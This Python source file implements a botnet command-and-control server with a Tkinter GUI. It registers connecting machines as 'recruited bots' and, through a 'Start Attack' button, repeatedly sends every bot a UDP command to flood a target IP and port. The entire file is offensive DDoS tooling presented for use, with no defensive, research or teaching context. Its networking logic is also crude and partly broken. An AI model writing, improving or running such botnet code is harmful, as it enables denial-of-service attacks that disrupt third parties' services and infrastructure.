import socket
import threading
import random
import time
from tkinter import *
from tkinter import messagebox

class Bot:
    def __init__(self, name, id, ip, port):
        self.name = name
        self.id = id
        self.ip = ip
        self.port = port

    def __repr__(self):
        return "Bot: {} ({})".format(self.name, self.id)

class BotnetCommandAndControl:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.bots = []

    def listen(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind((self.server_ip, self.server_port))
            sock.listen(10)

            print("Server listening on {}:{}".format(self.server_ip, self.server_port))

            while True:
                conn, addr = sock.accept()
                threading.Thread(target=self.handle_conn, args=(conn, addr)).start()
        except socket.gaierror:
            print("Invalid server IP. Please use a valid IP address.")
            return

    def handle_conn(self, conn, addr):
        print("New connection from {}:{}".format(addr[0], addr[1]))

        # Verify and add bot to the list
        name = "Bot {}".format(self.bots.__len__())
        # Add your own verification logic here
        id = self.bots.__len__()
        ip = addr[0]
        port = addr[1]
        self.bots.append(Bot(name, id, ip, port))
        print("{} recruited.".format(name))

        # Send welcome message to new bot
        conn.send(("Welcome, {} (ID: {})".format(name, id)).encode())

        self.bot_count.set("Recruited Bots: {}".format(len(self.bots)))

    def start_attack(self, target_ip, target_port):
        print("Starting attack on {}:{}".format(target_ip, target_port))

        # Loop through bots and start attack threads
        for bot in self.bots:
            threading.Thread(target=self.start_attack_thread, args=(bot, target_ip, target_port)).start()

    def start_attack_thread(self, bot, target_ip, target_port):
        # Prepare a UDP socket for the attack
        attack_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while True:
            # Send an attack command to the bot
            attack_sock.sendto(("Attack {}:{}".format(target_ip, target_port)).encode(), (bot.ip, bot.port))
            time.sleep(0.1)

class GUI:
    def __init__(self):
        self.root = Tk()
        self.root.title("Botnet Command and Control")

        self.botnet_cc = None

        self.server_ip = StringVar()
        self.server_port = StringVar()
        self.target_ip = StringVar()
        self.target_port = StringVar()
        self.bot_count = StringVar()
        self.bot_count.set("Recruited Bots: 0")

        Label(self.root, text="Server IP:").pack()
        Entry(self.root, textvariable=self.server_ip).pack()

        Label(self.root, text="Server Port:").pack()
        Entry(self.root, textvariable=self.server_port).pack()

        Button(self.root, text="Start Server", command=self.start_server).pack()

        Label(self.root, textvariable=self.bot_count).pack()

        Label(self.root, text="Target IP:").pack()
        Entry(self.root, textvariable=self.target_ip).pack()

        Label(self.root, text="Target Port:").pack()
        Entry(self.root, textvariable=self.target_port).pack()

        Button(self.root, text="Start Attack", command=self.start_attack).pack()

    def start_server(self):
        server_ip = self.server_ip.get()
        try:
            socket.inet_aton(server_ip)
        except socket.error:
            messagebox.showerror("Invalid server IP", "Please use a valid IP address.")
            return

        server_port = int(self.server_port.get())

        self.botnet_cc = BotnetCommandAndControl(server_ip, server_port)
        self.botnet_cc.bot_count = self.bot_count

        # Start botnet command and control server
        threading.Thread(target=self.botnet_cc.listen).start()

    def start_attack(self):
        if self.botnet_cc:
            target_ip = self.target_ip.get()
            target_port = int(self.target_port.get())

            # Start DDoS attack
            self.botnet_cc.start_attack(target_ip, target_port)
        else:
            messagebox.showerror("Server not started", "Please start the server before starting an attack.")

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    gui = GUI()
    gui.run()
